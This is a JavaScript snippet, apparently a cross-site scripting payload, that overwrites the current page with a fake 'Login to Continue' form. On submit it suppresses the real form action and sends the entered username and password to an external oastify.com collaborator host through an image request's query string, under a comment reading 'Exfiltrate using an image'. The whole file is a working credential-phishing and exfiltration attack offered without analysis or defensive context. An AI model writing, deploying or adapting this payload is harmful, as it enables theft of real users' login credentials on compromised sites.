(function () {

document.documentElement.innerHTML = `
<head>
<style>
body{
  margin:0;
  background:#0b0f17;
  font-family: Inter, sans-serif;
  display:flex;
  align-items:center;
  justify-content:center;
  height:100vh;
}
#loginBox{
  background:#0b0f17;
  color:white;
  padding:2rem;
  border-radius:12px;
  width:320px;
  box-shadow:0 0 20px rgba(138,99,255,0.6);
}
#loginBox h2{
  text-align:center;
  color:#8a63ff;
}
input{
  width:100%;
  padding:10px;
  margin-bottom:12px;
  border:1px solid #2a2f3c;
  border-radius:8px;
  background:#1a1f2c;
  color:white;
}
button{
  width:100%;
  padding:10px;
  background:linear-gradient(90deg,#8a63ff,#5a3cc8);
  border:none;
  border-radius:8px;
  color:white;
  font-weight:bold;
  cursor:pointer;
}
</style>
</head>

<body>
<div id="loginBox">
<h2>Login to Continue</h2>

<form id="loginForm">
<input name="username" id="username" placeholder="Username" required>
<input name="password" id="password" type="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>

</div>
</body>
`;

document.getElementById("loginForm").onsubmit = function(e){
    e.preventDefault();

    var user = document.getElementById("username").value;
    var pass = document.getElementById("password").value;

    // Exfiltrate using an image
    var img = new Image();
    img.src = "https://cp5xp49c6766ff3a9pf2xw9u7ldc13ps.oastify.com/?" +
              "u=" + encodeURIComponent(user) +
              "&p=" + encodeURIComponent(pass);

    // e.target.submit();
};
